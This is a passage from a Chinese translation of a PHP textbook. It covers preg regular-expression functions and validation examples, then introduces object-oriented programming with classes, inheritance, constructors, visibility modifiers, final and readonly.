下面是一个用于说明这一点的小示例：

```php
$text = "Otto";
$reg = "/(Ot|ot)|(to|tt)/";
preg_match_all($reg, $text, $parts, PREG_PATTERN_ORDER);
```

这将返回 `Ot` 和 `to` 作为所有模式检查的结果。各个区域分别提供一个结果（参见图 10.4）。

![](img/ae7820c36e8f24c1623d26668b28e80e_298_0.png)

图 10.4 各个组件

另一方面，`PREG_SET_ORDER` 按顺序排列结果，使第一个数组元素对应第一个括号的结果，第二个对应第二个括号的结果，以此类推（参见图 10.5）。

```php
<?php
$text = "Otto";
$reg = "/(Ot|ot)|(to|tt)/";
preg_match_all($reg, $text, $parts, PREG_SET_ORDER);
print_r($parts);
?>
```

### 清单 10.4 "preg_match_all()" 的选项 ("preg_match_all_opt.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_298_1.png)

图 10.5 各个组件的两个结果

### 10.2.2 更多函数

除了 `preg_match()` 之外，还有几个其他函数可用于执行简单搜索以外的进一步操作，如表 10.1 所示。

| 函数 | 描述 |
| :--- | :--- |
| preg_split (RegEx, String, Limit, Mode) | 在指定为 RegEx 模式的分隔符处拆分字符串。返回一个数组，其各个元素为不带分隔符的组件。如果设置了 Limit，则仅执行在那里指定的数量的分隔符。最后一个元素然后包含字符串的其余部分。-1 表示无限制。如果将模式作为最后一个参数设置，则需要此选项。这里可用的选项如下：PREG_SPLIT_NO_EMPTY 在拆分时省略空部分。PREG_SPLIT_DELIM_CAPTURE 还返回正则表达式中括号区域的各个结果。PREG_SPLIT_OFFSET_CAPTURE 返回位置。 |
| preg_replace (RegEx, replacement, element, limit, number) | 将模式替换为替换内容。该函数返回结果。limit 指定要执行的替换次数。number 返回替换次数。preg_replace() 还替换数组中的表达式：`$data = array("Hanno", "Anne"); $reg = "/nn/"; $result = preg_replace($reg, "ll", $data);` 在 $result 数组中，Hanno 变为 Hallo，Anne 变为 Alle。 |
| preg_replace_callback (RegEx, function, element, limit, number) | 工作方式与 preg_replace() 相同，但此函数执行一个函数，而不是替换字符串。 |
| preg_grep (RegEx, Array, Mode) | 在数组中搜索正则表达式。返回带有结果的数组。可以为可选 mode 参数指定 PREG_GREP_INVERT。然后返回不在数组中的元素。 |
| preg_quote (expression, separator) | 对正则表达式的模式字符进行求值。作为可选的第二个参数，可以指定一个字符，用作正则表达式前后的分隔符。这通常是斜杠（/）。 |

表 10.1 Perl 兼容的正则表达式函数

### 10.2.3 重复使用替换字符串

可以在正则表达式中使用圆括号定义多个搜索字符串。在替换时这很有帮助，因为你可以再次“找到”各个搜索字符串，然后例如重新格式化它们。下面的示例将形式为“名 姓”的名称更改为“姓，名”变体，如图 10.6 所示。

```php
$name = "Ann Meyer";
$name_rotated = preg_replace("/([a-z]+)\s+([a-z]+)/i", "\\2, \\1", $name);
echo $name_rotated;
```

![](img/ae7820c36e8f24c1623d26668b28e80e_300_0.png)

图 10.6 由正则表达式“旋转”的姓名

> 注意
> 此处的示例并不完美；例如，如果有多个名，该表达式将失败。

### 10.2.4 搜索模式的修饰符

正则表达式有几个修饰符可更改 RegEx 引擎的行为。一个示例是 `i`。如果在结束字符之后插入此字符，则正则表达式不区分大小写。因此，以下表达式既匹配 `a` 也匹配 `A`：

/a/i

除了修饰符的字母之外，还有内部名称。例如，`i` 对应的内部名称是 `PCRE_CASELESS`。

下面是另外两个示例：

- `x` (`PCRE_EXTENDED`) 忽略搜索模式中的空格。
- `U` (`PCRE_UNGREEDY`) 将正则表达式切换为“不贪婪”。这意味着 `\d` 等量词，即使没有最大数量说明，也不会返回其后的所有字符，而仅返回第一个字符。




> **注意**
> 所有修饰符的概述可以在 PHP 文档中找到，网址为 http://s-prs.co/v602215.

## 10.3 应用示例

在本节中，我们将向您展示正则表达式的一些有用应用示例，例如表单验证。

> **注意**
> 在本书中，您将找到更多正则表达式示例，例如在第 13 章的完整性检查中。那里会对电子邮件地址进行检查。这个难题也在 http://s-prs.co/v602216 中讨论。

### 10.3.1 邮政编码

邮政编码验证非常简单。美国邮政编码始终由五位数字组成。您可以按以下方式检查：

```
$reg = "/^\d{5}$/";
```

此外，邮政编码可以带有四位数字的第二部分。分隔符可以是空格或连字符，之后是四位数字：

```
$reg = "/^(\d{5})([-\s](\d{4}))?$/";
```

因此，您有以下测试：

- `(\d{5})` 匹配邮政编码第一部分的 5 位数字。括号使其可作为 `preg_match()` 的 parts 数组中的一部分访问。
- `(? ... )` 将分隔符（空格或连字符）与第二组四位数字分组为一个组。末尾的问号表示该组是可选的
- `[-\s]` 匹配带 `\s` 的空格或连字符
- `(\d{4})` 匹配作为 parts 数组第 2 部分的 4 位数字。

括号有助于单独访问邮政编码的各个部分。以下简单示例使用 Perl 正则表达式，图 10.7 显示了结果。

```php
<?php
$zip = "50000-4000";
$reg = "/^(\d{5})([-\s](\d{4}))?$/";
if (preg_match($reg, $zip, $parts)) {
    print "Zip part 1: " . $parts[1];
    if (isset($parts[2])) {
        print "<br />Zip part 2: " . $parts[2];
    }
}
?>
```

## 清单 10.5 读取邮政编码（“zip.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_302_0.png)

## 图 10.7 各部分中的邮政编码

### 10.3.2 电话和传真号码

电话和传真号码很难检查，因为它们可能有多种不同的变体。例如，+1 (123) 456-7890 是有效的电话号码，但 123-456-7890（没有国家前缀）也可能是有效的。

要进行有意义的检查，您必须在 Web 表单中提供非常精确的信息，例如分别查询区号、国家和号码。最广泛的方法是允许所有可能的分隔符和数字：

```
$reg = "/^(\\d|\\s|\\+|-|\\.|\\,|\\/|\\(|\\))*$/";
```

然而，与大多数正则表达式检查一样，任何组合都是可能的。

### 10.3.3 过滤链接

在分析文本文档（例如 XML 或 HTML 格式）时，正则表达式非常有用。一个常见示例是过滤链接。

> **注意**
> 
> 在第 35 章中，您将找到一个不使用正则表达式即可过滤链接的示例，但它的效果不佳。

现在，我们将向您展示一个带有正则表达式的脚本。该正则表达式会筛选出链接。由于链接目标和名称周围放置了圆括号，您也可以单独访问它们，如图 10.8 所示。

```php
<?php
$html = '<html><body><a id="test" href="rheinwerk-publishing.com" target="top">Rheinwerk Publishing</a><br /><a href="../newdoc.html">NewDoc</a></body></html>';
$reg = "/<\\s*a[^h]*[^r]*[^e]*[^f]*href=\"(([^\\"]+)\")([^>])*(([^<])*<\\/a>/";
if (preg_match_all($reg, $html, $parts)) {
    print_r($parts);
}
?>
```

## 清单 10.6 从 HTML 文档中过滤链接（“links.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_303_0.png)

## 图 10.8 数组包含所有结果，然后是各个结果分别显示

> **提示**
> 
> 如果您还想过滤带有大写字母的链接，只需在分隔符末尾添加一个 i：
> 
> $reg = "/<\\s*a[^h]*[^r]*[^e]*[^f]*href=\"(([^\\"]+)\")([^>])*(([^<])*<\\/a>/i";

# 第 11 章

# 面向对象编程

面向对象编程是现代软件开发的核心。PHP 提供了必要的工具。

面向对象（即面向对象编程 [OOP] 的核心）最重要的优点如下：

- 模块化——即划分为较小的代码模块
- 灵活性——即轻松访问拆分后的模块

到第 4 至 6 章结束时，您将熟悉过程式编程。循环和条件分支决定执行顺序；函数存储功能并可被调用。OOP 打破了这种线性且有时僵化的概念，将功能分布到逻辑单元中：类和对象。您可以在 11.2 节中学习这方面的基础知识。不过在此之前，我们先简要介绍一下 PHP 中面向对象的历史。

## 11.1 PHP 中面向对象的历史

与 Java 和 ASP.NET 不同，PHP 并非面向对象的先驱，但最晚在 PHP 5 中，其可能性才大幅增长。如今，在面向对象方面，PHP 已与所有其他 Web 编程语言持平。

OOP 在 PHP 4 项目中仍然相对较少使用。原因之一是模块化只在慢慢被接受。通常，Web 项目不需要那么多代码，以至于 OOP 特别有优势。另一方面，PHP 4 的面向对象功能相当有限。

PHP 5 几乎彻底改变了面向对象的概念。主要原因是底层的 PHP 语言核心 Zend Engine II。PHP 5 中面向对象的成功也相应地非常显著：至今没有已知的基于 PHP 的开源项目还能离开它。随着时间的推移和各种 PHP 5 版本的推出，添加了许多新功能，包括静态后期绑定（第 11.3.6 节）、新错误级别（第 11.4.1 节）以及第 11.5 节中描述的错误级别。

最后，在 PHP 7 中，底层 PHP 引擎进行了彻底改版，性能大幅提升——但面向对象特性与 PHP 5 保持一致。

新功能包括匿名类（第 11.3.8 节）。在较新版本的 PHP 7 中，详细改进不断被添加（另见第 1 章）：

- 在 PHP 7.1 中，为方法参数添加了 `iterable` 伪类型，表示传递的对象是 `iterable`——即已实现 `Traversable` 接口。
- `instanceof` 运算符允许将字面量作为第一个操作数，结果为 `false`。
- 自 PHP 7.1 起，可以使用 `public`、`protected` 和 `private` 定义常量的可见性。
- 自 PHP 7.2 起，函数参数有了新的 `object` 类型。
- 自 PHP 7.2 起，将数组转换为对象时对数字索引的处理已更改。
- 使用 `Closure` 类的新 `fromCallable()` 静态方法，自 PHP 7.1 起可以将方法转换为 `Closure` 对象。
- 自 PHP 7.2 起，抽象方法可以在继承的抽象类中被重写。
- 自 PHP 7.2 起，重写的方法可以省略参数类型。
- 自 PHP 7.2 起，有逗号分隔的命名空间分组语法。

PHP 8 主要以更清晰的代码和适度的严格性为特征。后者旨在例如避免由类型错误引起的简单错误，并总体上编写更好的代码。以下是最重要新功能的概述：

- 面向对象方法采用 PHP 8 的新功能，这些功能也适用于函数（另见第 6 章）。
- 命名参数允许无论参数顺序如何都能访问方法参数。
- 联合类型通过为方法参数或其返回值定义多种类型来扩展类型系统。
- PHP 8 允许参数列表末尾使用逗号，作为一种小的语法补充。
- 新引入的构造函数属性提升功能，在构造函数中创建属性时节省了大量不必要的输入。
- 通过所谓的属性，PHP 8 引入了原生元数据，您也可以通过反射 API 在运行时访问它。
- `static` 现在也允许作为方法返回值的类型。
- 在 PHP 8 中，同名私有方法的继承不再“不必要地”检查。
- WeakMap 是 PHP 7.4 中引入的“弱”引用的新标准类。其背后的想法是使对象引用可访问，但在对象被删除时不保留。基本上，它是一种对象缓存（更多信息请参阅 https://wiki.php.net/rfc/weak_maps）。





- PHP 8 自动为使用 `__toString()` 的类添加新的 `__Stringable` 接口（`https://wiki.php.net/rfc/stringable`）。
- PHP 8.1 添加了将属性声明为 `readonly` 的选项。在 PHP 8.2 中，`readonly` 也成为了类级别的选项。
- 从 PHP 8.1 开始，对象也可以用作静态变量、参数默认值，以及属性的全局常量和参数。
- 在 PHP 8.1 中，动态设置的属性被归类为已弃用。不过，可以通过设置 `#[AllowDynamicProperties]` 特性专门为某个类允许此行为。
- 从 PHP 8.1 开始，类中的常量也可以标记为 `final`。
- 从 PHP 8.3 开始，常量也可以使用数据类型进行类型声明。
- 在 PHP 8.3 中，`#[Override]` 特性允许你标记一个（顾名思义）重写另一个方法的方法。

## 11.2 类和对象：基本概念

顾名思义，_对象_ 是面向对象编程的核心。最好将对象视为某种真实存在的事物。例如，你桌上或桌下的电脑就是一个对象。现在，用编程语言无法完全描述一台电脑。即使是电脑的三维模型也无法涵盖其所有方面。例如，缺少了风扇特有的嗡嗡声。

但是，面向对象编程的目的并不是精确描述，而是使用相关对象的某些方面。对象由多个 _属性_ 组成。例如，电脑的一个属性可以是所使用的 CPU。对象还具有 _方法_。与函数类似，方法包含功能，并为对象提供该功能。例如，电脑可以具有 `start()` 方法。由于有圆括号，你已经可以看出属性和方法之间的区别了。

但这与 _类_ 这个术语有什么关系呢？类定义了对象的结构。_结构_ 是指对象的属性和方法。这意味着 `computer` 类为所有单个电脑定义了属性和方法。然而，属性尚未赋值。类仅指定结构。特定的电脑（例如你的个人电脑）则是一个对象（参见图 11.1）。

对象是类的 _实例_。可以说实例“属于”类，并且对象必须相应地 _实例化_。当然，可以从一个类实例化任意数量的对象。这是面向对象编程灵活性的一部分。

![](img/ae7820c36e8f24c1623d26668b28e80e_308_0.png)

**图 11.1 类与对象的关系**

### 11.2.1 PHP 中的类和对象

目前为止，这全都是理论。现在让我们来看一些代码，以便你能更好地了解面向对象编程。以下代码创建一个类，该类具有一个 CPU 属性和一个 `start()` 方法：

```php
class Computer {
    public $CPU = "The CPU";
    public function start() {
        echo "Computer started";
    }
}
```

表示类的 class 关键字至关重要。¹ 属性使用 public 关键字定义并赋予值。在此上下文中，public 表示该属性可以从类外部访问。² 你可以为每个对象调整此值。方法的定义方式与函数完全相同。

你现在必须创建（或实例化）此类的一个对象才能使用它。这涉及 new 关键字：

```php
$MyComputer = new Computer();
```

新对象被赋值给一个变量。语法如下：

```php
$Object = new Class();
```

1 类也有命名空间。它们用于在命名空间内组织不同的类。这样做的目的是提供更好的概览。有关详细信息，请参阅第 11.5 节。

2 将在 11.3.4 节中详细介绍。

要访问方法或属性，PHP 对方法使用以下语法：

```php
$Object->Method();
```

对属性则如下：

```php
$Object->Property;
```

然后像这样调用 `Computer` 类的 `start()` 方法：

```php
$MyComputer->start();
```

![](img/ae7820c36e8f24c1623d26668b28e80e_309_0.png)

**图 11.2 方法返回输出**

> 注意
>
> PHP 使用一种有些不寻常的语法，即减号加上大于号——也就是箭头 (`->`）。相比之下，基于 C 的语言通常对方法使用点语法：
> Object.method()
> 对属性则为：
> Object.property
>
> 不过，转换并不太复杂。在这方面，即使是新手也应该能够很好地应对 PHP 语法。

### 11.2.2 属性

属性可以读取和更改。以下脚本读取一个属性并将其输出。

```php
<?php
class Computer {
public $CPU = "The CPU";
public function start() {
echo "Computer started";
}
}

$MyComputer = new Computer();
echo $MyComputer->CPU;
?>
```

**列表 11.1 读取属性 ("properties.php")**

因此，输出结果是屏幕上显示的文本 "The CPU"。

> 注意
>
> public 关键字将属性定义为公开。要以绝对纯净的面向对象方式工作，不应直接读取属性，而应将其定义为 private（第 11.3.4 节），然后使用方法读取它。PHP 4 仍保留旧的 var 关键字，其功能等同于 public，但不应再使用。

要更改属性，只需使用赋值运算符 (=) 为其分配新值。以下脚本更改电脑的 CPU 属性，并在更改前后输出其值，如图 11.3 所示。

```php
<?php
class Computer {
public $CPU = "The CPU";
public function start() {
echo "Computer started";
}
}

$MyComputer = new Computer();
echo $MyComputer->CPU . "<br />";
$MyComputer->CPU = "3 GHz";
echo $MyComputer->CPU;
?>
```

**列表 11.2 更改属性的值 ("properties_change.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_310_0.png)

**图 11.3 "CPU" 属性的值已更改**

> 注意
>
> 属性的值仅更改相应对象的值。其他对象仍具有类中指定的属性值：

```php
$MyComputer = new Computer();
$MyComputer->CPU = "3 GHz";
$MyLaptop = new Computer();
echo $MyLaptop->CPU;
```

以上代码将输出 The CPU，因为仅更改了 MyComputer 对象的值，而未更改 MyLaptop 对象的值。

### 11.2.3 方法

方法可以包含任意数量的功能。如已所示，访问方式与属性非常相似。但是，使用方法可以做更多事情。

#### 方法的参数

方法可以接受任意参数（参见图 11.4）。其工作方式与函数相同。

```php
<?php
class Computer {
public function shutdown($seconds) {
echo "Computer will shut down in $seconds seconds";
}
}

$MyComputer = new Computer();
$MyComputer->shutdown(12);
?>
```

**列表 11.3 将值传递给方法 ("methods_parameters.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_311_0.png)

**图 11.4 带有参数值的消息**

与函数一样，你也可以为参数指定默认值。请参考以下简单示例。

```php
<?php
class Computer {
 function shutdown($seconds = 20) {
 echo "Computer will shut down in $seconds seconds";
 }
}
$MyComputer = new Computer();
$MyComputer->shutdown();
?>
```

**列表 11.4 带有默认值的方法 ("methods_parameters_default_value.php")**

该函数现在输出电脑将在 20 秒后关闭。默认情况下，参数按值传递。对象是唯一的例外：它们按引用传递。要将其他参数按引用传递，请在参数名前使用 &。

```php
<?php
class Computer {
 public function shutdown(&$seconds) {
 echo "Computer will shut down in $seconds seconds";
 }
}
$duration = 12;
$MyComputer = new Computer();
$MyComputer->shutdown($duration);
?>
```

**列表 11.5 方法参数作为引用 ("methods_parameters_asreference.php")**

#### 返回值

与函数的相似之处不仅如此。方法可以像函数一样使用 return 返回值。图 11.5 显示了以下示例的结果。

```php
<?php
class Computer {
 public function start($medium) {
 return "The computer starts from $medium";
 }
}
```



```
$MyComputer = new Computer();
echo $MyComputer->start("a stick");
?>
```

## 清单 11.6 带有返回值的方法 ("methods_return.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_313_0.png)

## 图 11.5 仅在返回值后才会产生输出

> **提示**
> 当然，为函数提到的其他细节在此也同样适用。例如，如果您需要多个返回值，可以使用数组来实现。

## "$this": 访问属性和方法

到目前为止，方法仅出现在对象之内，没有交互。然而，当方法与其他属性和方法交互时，才真正发挥作用。如果要在方法中调用同一对象的属性或方法，则需要对该对象的引用。但是，由于可以从一个类创建不同的对象，您预先不知道对象的名称。对于这种情况，有 $this 关键字，它提供对当前对象的引用。

With

```
$this->Property
```

or

```
$this->method()
```

您可以使用它们来访问类的其他属性和方法。在下面的简单实用示例中，该方法返回一个字符串，其中包含 CPU 属性的值等内容（参见图 11.6）。

```
<?php
class Computer {
public $CPU = "The CPU";
public function getCPU() {
return "The computer is equipped with a $this->CPU CPU.";
}
}
$MyComputer = new Computer();
$MyComputer->CPU = "4 GHz";
echo $MyComputer->getCPU();
?>
```

## 清单 11.7 "this" 的用法 ("methods_this.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_314_0.png)

## 图 11.6 属性已包含在使用 "$this" 的方法输出中

> **提示**
> 使用以 `get` 开头的方法读取属性是面向对象编程中的常见做法。其对应方法通常是以 `set` 开头并设置属性值的方法。

## 重载

PHP 不支持函数的经典重载。这意味着您无法创建多个各自具有不同参数的方法。但是，可以模拟重载。对于参数数量，您可以使用默认值或用于读取可变数量参数的函数来实现重载。

不过，您可以使用类型识别函数并借助情况区分来筛选不同的数据类型。以下小示例检查秒数是否指定为数字。如果是，脚本会附加带有单位的字符串。

```
class Computer {
public function shutdown($seconds) {
if (is_integer($seconds)) {
$seconds = $seconds . " seconds";
}
echo "Computer is shutting down in $seconds";
}
}
```

## 清单 11.8 使用不同数据类型的重载 ("objects_overload.php")

这种重载方法的优点在于，无论是以下调用：

```
$MyComputer = new Computer();
$MyComputer->shutdown(12);
```

还是带有单位的调用：

```
$MyComputer = new Computer();
$MyComputer->shutdown("12 seconds");
```

都会产生相同的输出，如图 11.7 所示。

![](img/ae7820c36e8f24c1623d26668b28e80e_315_0.png)

## 图 11.7 单位也被附加

> **提示**
> 您当然可以像这里所示模拟重载。这有时很实用。但是，所需的大量情况区分未必优雅。因此，您应该谨慎使用此工具。

### 11.2.4 继承

迄今为止，您只见过一个孤立的类。但在实践中，类层次结构会迅速出现。这意味着一个类会继承另一个更高级别类的属性和方法。此过程称为继承。

请考虑一个简单示例：Computer 类适用于所有计算机。但是，笔记本电脑或台式机等特殊计算机可以有自己的属性和方法。例如，笔记本电脑仍然集成显示屏。而台式机则可以（更轻松地）拆卸。

这种类层次结构也可以在 PHP 编程中表达。为此使用 extends 关键字。4 其理论用法如下：

> 4 PHP 只支持单继承。这意味着没有类可以从多个类继承。

```
class Name extends OtherClass {
    private $Property;
    public function Method() {
        instructions;
    }
}
```

新类 *扩展* 一个现有类。这意味着它采用该类的所有属性和方法，然后定义自己的属性和方法。

请考虑以下小示例。

```
<?php
class Computer {
    public $CPU = "The CPU";
    public function start() {
        return "Computer is started.";
    }
}

class Laptop extends Computer {
    public $Display = "15 inch";
}

$MyLaptop = new Laptop();
$MyLaptop->CPU = "2.5 GHz Mobile";
echo "CPU: $MyLaptop->CPU<br/>";
echo "Display: $MyLaptop->Display";
?>
```

## 清单 11.9 使用 "extends" 的继承 ("inheritance.php")

在示例中，Laptop 类扩展 Computer 类。Laptop 被赋予一个额外属性。输出（参见图 11.8）随后访问此属性，但也访问 Computer 类的父类 CPU 属性。

![](img/ae7820c36e8f24c1623d26668b28e80e_316_0.png)

## 图 11.8 脚本输出自身属性和父类属性

## 重写

通过继承，您可以在子类（继承类）中重写父类的属性和方法。为此，只需创建一个与父类中对应项同名的属性或方法即可。在以下示例中，CPU 属性和 start() 方法均被重写；图 11.9 显示了结果。

```
<?php
class Computer {
public $CPU = "The CPU";
public function start() {
return "Computer is started.";
}
}
class Laptop extends Computer {
public $CPU = "2.5 GHz Mobile";
public function start() {
return "Laptop is started.";
}
}
$MyLaptop = new Laptop();
echo "CPU: $MyLaptop->CPU<br />";
echo $MyLaptop->start();
?>
```

## 清单 11.10 重写属性和方法 ("inheritance_overwrite.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_317_0.png)

## 图 11.9 属性和方法已被重写

## 间接访问方法

如果要从方法中访问父类的方法，则需要对该类的引用。您可以实例化一个对象或使用冒号语法直接访问类，但那样您始终需要知道类的名称。更聪明的替代方案是使用 parent 关键字。这使您可以访问父类，而无需知道其名称。

```
<?php
class Computer {
    public $CPU = "The CPU";
    public function start() {
        return "Computer is started.";
    }
}
class Laptop extends Computer {
    public function start() {
        return "Laptop: " . parent::start();
    }
}
$MyLaptop = new Laptop();
echo $MyLaptop->start();
?>
```

## 清单 11.11 通过 "parent" 访问 ("inheritance_parent.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_318_0.png)

## 图 11.10 输出也基于父类的方法

> **注释**
> 在这种情况下，使用 `$this` 关键字引用类的属性不起作用，因为 `$this` 始终引用当前对象。但是，通过直接链接到类的方法，没有对象。

## 11.3 进阶

您现在了解了面向对象的基础知识。现在是时候深入了解更精细的细节了。这包括某些方法，还包括接口和抽象类。

### 11.3.1 克隆对象

PHP 按引用传递对象。这在 PHP 4 中最初有所不同，PHP 4 中将对象视为值。

> **注释** 您可以在本书资料中找到一个测试示例（参见前言）。它名为 objects_values.php。

但是，如何将对象作为值传递给函数呢？为此，您需要克隆对象。为此使用 clone 关键字。在这种情况下，会创建原始实例的副本并将其传递给函数。您可以在图 11.11 中看到结果。

```
<?php
class Computer {
public $CPU = "The CPU";
public function start() {
echo "Computer is started.";
}
}
function change($object) {
$object->CPU = "4 GHz";
echo "In the function: $object->CPU<br />";
}
$MyComputer = new Computer();
change(clone $MyComputer);
echo "Outside the function: $MyComputer->CPU";
?>
```

## 清单 11.12 "clone" 命令 ("clone.php")

但是，克隆不仅用于将对象作为值传递；还可以用于根据需要多次复制对象实例。

![](img/ae7820c36e8f24c1623d26668b28e80e_319_0.png)

## 图 11.11 函数内适用克隆对象的值；函数外适用原始对象的值

### 11.3.2 构造函数

构造函数是在创建类的对象时执行的方法。为此使用 __construct() 方法。它可以接受用于实例化对象的任何参数。





在以下示例中，对象传递字符串 4 GHz。然后将其分配给 CPU 属性。构造方法随后输出一段文本。最后，输出 CPU 的值。

```
<?php
class Computer {
public $CPU = "The CPU";
public function __construct($value) {
$this->CPU = $value;
echo "Object instantiated<br />";
}
}
$MyComputer = new Computer("4 GHz");
echo $MyComputer->CPU;
?>
```

清单 11.13 __construct() ("constructor.php")

该清单产生以下输出：

对象已实例化
4 GHz

## 属性提升

在 PHP 8 中，构造方法中定义属性有一种简写形式，即所谓的属性提升。原理很简单：您可以直接在构造方法中定义属性，甚至可以定义为公共可用属性。

使用此表示法，上一节的清单减少了两行。以下三行：

```
public $CPU = "The CPU";
public function __construct($value) {
$this->CPU = $value;
```

变为一行：

```
public function __construct(public $CPU = "The CPU") {
```

需要注意的是，$CPU 属性的访问方式与在构造方法外部定义的属性完全相同：

```
echo $MyComputer->CPU;
```

以下清单提供完整示例。

```
<?php
class Computer {
public function __construct(public $CPU = "The CPU") {
echo "Object instantiated<br />";
}
}
$MyComputer = new Computer("4 GHz");
echo $MyComputer->CPU;
?>
```

清单 11.14 在构造方法中定义属性 ("constructor_property_promotion.php")

对于单个属性，这并不特别，但如果需要为类定义许多初始属性，您将获得更多清晰度。

### 11.3.3 析构函数

当对象被销毁时，__destruct() 析构方法始终被使用。例如，当使用 unset(object) 解除对象时，它也会作出反应（参见图 11.12）。

```
<?php
class Computer {
public $CPU = "The CPU";
public function __destruct() { echo "Destructor active"; }
}
$MyComputer = new Computer();
unset($MyComputer);
echo "$MyComputer->CPU<br />";
?>
```

清单 11.15 "__destruct()" ("objects_destructor.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_321_0.png)

图 11.12 析构函数输出其消息；"CPU" 已被销毁

### 11.3.4 private、protected 等等

private、public、static 和 protected 关键字在面向对象编程中起着重要作用。它们用于控制对属性和方法的访问。自 PHP 7.1 起，它们也被允许用于常量的访问控制。

### "private" 和 "public"

在 PHP 中，您可以将属性、常量和方法标记为 private。此类 private 属性或方法只能由对象内部的另一个方法调用，不能从外部调用。

在以下示例⁵中，CPU 属性被标记为 private。

```
<?php
class Computer {
    private $CPU = "The CPU";
    function getCPU() {
        return $this->CPU;
    }
}
$MyComputer = new Computer();
echo $MyComputer->CPU;
echo $MyComputer->getCPU();
?>
```

清单 11.16 标记为 "private" 的属性 ("private.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_322_0.png)

图 11.13 访问 private 属性会导致错误

5 视错误级别而定，此处可能会出现两个提示。

在这种情况下，由于访问 private 属性失败，脚本会产生图 11.13 所示的错误消息。getCPU() 方法展示了如何实际访问 private 属性。如果注释掉直接访问的那一行，脚本就会正常工作，如图 11.14 所示：

```
//echo $MyComputer->CPU;
```

![](img/ae7820c36e8f24c1623d26668b28e80e_323_0.png)

图 11.14 方法正确输出属性

private 也可用于方法。然后必须在另一个方法中使用该方法。请参考以下简单示例；输出如图 11.15 所示。

```
<?php
class Computer {
private function format() {
return "Hard disk formatted";
}
function start() {
return "Computer started, ".$this->format();
}
}
$MyComputer = new Computer();
echo $MyComputer->start();
?>
```

清单 11.17 标记为 "private" 的方法 ("private_method.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_323_1.png)

图 11.15 private 方法的输出通过 public 方法读取

> **注意**
> 默认情况下，每个属性或方法都是 public。但是，您还应使用 public 关键字明确将属性或方法标记为 public：

```
class Computer {
public $CPU = "The CPU";
}
```

在面向对象编程中，您应始终将属性标记为 `private`，并仅通过标记为 `public` 的方法使其可访问。这种属性封装是良好编程风格的一部分，可帮助您在脚本中保持秩序。使用对象模型⁶ 和设计模式⁷ 时也有帮助。读取属性的方法常用命名约定是 `getPropertyName()`，设置属性的方法是 `setPropertyName(Value)`。这并非强制性，而仅是一种约定。

6 对象模型对应用程序、相关类和层次结构进行建模。用于此类模型的一种语言是 UML。
7 设计模式是解决面向对象编程中常见问题的方法。它们可以在 PHP 中使用，也可以在任何其他面向对象编程语言中使用。有关此主题的更多信息，请参见第 12 章。

### "static"

用 `static` 标记的属性和方法是 *静态的*，因为它们通过类名在类外部访问。您不需要对象。以下清单及其在图 11.16 中的输出展示了一个简单示例。

```
<?php
class Computer {
static $CPU = "The CPU";
static function start() {
return "Computer is started";
}
}

echo Computer::$CPU ."<br />";
echo Computer::start();
?>
```

清单 11.18 静态属性和方法 ("static.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_324_0.png)

图 11.16 访问静态属性和方法

> **注意**
>
> 在标记为 static 的方法中，无法使用 $this，因为没有对对象的引用。但是，self 可用作晚期静态绑定的一部分。有关晚期静态绑定的更多信息，请参见第 11.3.6 节。

### "protected"

如果使用 private，则属性或方法仅适用于定义它的那个类。protected 与 private 具有相同的外部保护效果，但此类属性或方法也适用于类层次结构中的所有类。

```
<?php
class Computer {
    protected $CPU = "3 GHz Mobile";
}

class Laptop extends Computer {
    public function getCPU() {
        return "The following CPU is on board: ".$this->CPU;
    }
}

$MyLaptop = new Laptop();
echo $MyLaptop->getCPU();
?>
```

清单 11.19 "protected" 的使用 ("protected.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_325_0.png)

图 11.17 读取来自父类的 CPU

在前面的示例中，用 protected 保护的属性定义在父类中。如果反过来，整个事情也能行吗？让我们检查一下：

```
class Computer {
    public function getCPU() {
        return "The following CPU is on board: ".$this->CPU;
    }
}
```

```
class Laptop extends Computer {
 protected $CPU = "3 GHz Mobile";
}
```

答案：是的，可以。protected 为整个类层次结构（即父类和所有继承类）开放属性或方法。

> 注意
> protected 对方法的使用与对属性的使用类似。您只需在方法前写上关键字：
> protected function innerCalculation() {
>  Instructions;
> }

### "final"

用 final 标记的方法不能在子类中被重写。因此，以下代码示例会导致错误，如图 11.18 所示。

```
<?php
class Computer {
 final function start() {
 return "Computer is started";
 }
 }
 class Laptop extends Computer {
 public function start() {
 return "Laptop is started";
 }
 }
 $MyLaptop = new Laptop();
 echo $MyLaptop->start();
?>
```

清单 11.20 "final" ("final.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_326_0.png)

图 11.18 "start()" 方法不得被重写





注意
在 PHP 8 中，这方面有所整理：如果继承类中有一个与标记为 `final` 的方法同名的 `private` 方法，则仍会抛出致命错误。在后台，PHP 会不必要地执行继承检查，即使继承类中的方法是 `private` 的。在 PHP 8 中，出于性能和整洁的原因，已移除此行为。

你也可以使用 `final` 来标识整个类。在这种情况下，你将无法再从这些类继承（参见图 11.19）。

```
final class Computer {
public function start() {
return "Computer is started";
}
}

class Laptop extends Computer {
public function start() {
return "Laptop is started";
}
}
```

清单 11.21 最终类（摘自 "final_class.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_327_0.png)

图 11.19 尝试访问最终类时出错

注意
没有最终属性。因此，以下结构会导致图 11.20 所示的错误消息，该消息指出 `final` 只能定义为方法：
`class Computer {
final $CPU = "The CPU";
}`

![](img/ae7820c36e8f24c1623d26668b28e80e_328_0.png)

图 11.20 "final" 用于属性失败

## "readonly"

自 PHP 8.1 起，新增了 `readonly` 属性。这允许将属性定义为只读且不可写：

```
private readonly string $sek;
```

在这种情况下，给属性赋值只有一种方式，即在构造函数中，因为没有值该属性将无意义：

```
public function __construct(string $sek) {
    $this->sek = $sek;
}
```

无法为其指定默认值，也无法在其他方法中稍后更改它。在这些情况下，PHP 会抛出错误。

以下清单展示了完整示例。

```php
<?php
class Computer {
private readonly string $sek;

public function __construct(string $sek) {
    $this->sek = $sek;
}

public function start() {
